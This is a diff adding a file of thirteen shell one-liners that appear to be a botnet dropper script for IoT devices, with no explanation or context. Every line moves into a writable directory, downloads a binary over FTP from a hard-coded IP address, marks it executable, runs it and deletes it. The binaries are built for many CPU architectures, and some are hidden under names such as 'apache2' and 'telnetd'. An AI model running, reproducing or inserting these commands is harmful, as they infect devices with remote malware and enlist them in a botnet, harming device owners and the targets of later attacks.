@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikomips marikomips; chmod 777 marikomips ./marikomips; rm -rf marikomips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikomipsel marikomipsel; chmod 777 marikomipsel ./marikomipsel; rm -rf marikomipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikosh4 marikosh4; chmod 777 marikosh4 ./marikosh4; rm -rf marikosh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikox86 marikox86; chmod 777 marikox86 ./marikox86; rm -rf marikox86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikoarmv6l marikoarmv6l; chmod 777 marikoarmv6l ./marikoarmv6l; rm -rf marikoarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikoi686 marikoi686; chmod 777 marikoi686 ./marikoi686; rm -rf marikoi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikoppc marikoppc; chmod 777 marikoppc ./marikoppc; rm -rf marikoppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikoi586 marikoi586; chmod 777 marikoi586 ./marikoi586; rm -rf marikoi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 marikom68l marikom68l; chmod 777 marikom68l ./marikom68l; rm -rf marikom68l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 sh sh; chmod 777 sh ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 apache2 apache2; chmod 777 apache2 ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 45.77.45.231 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
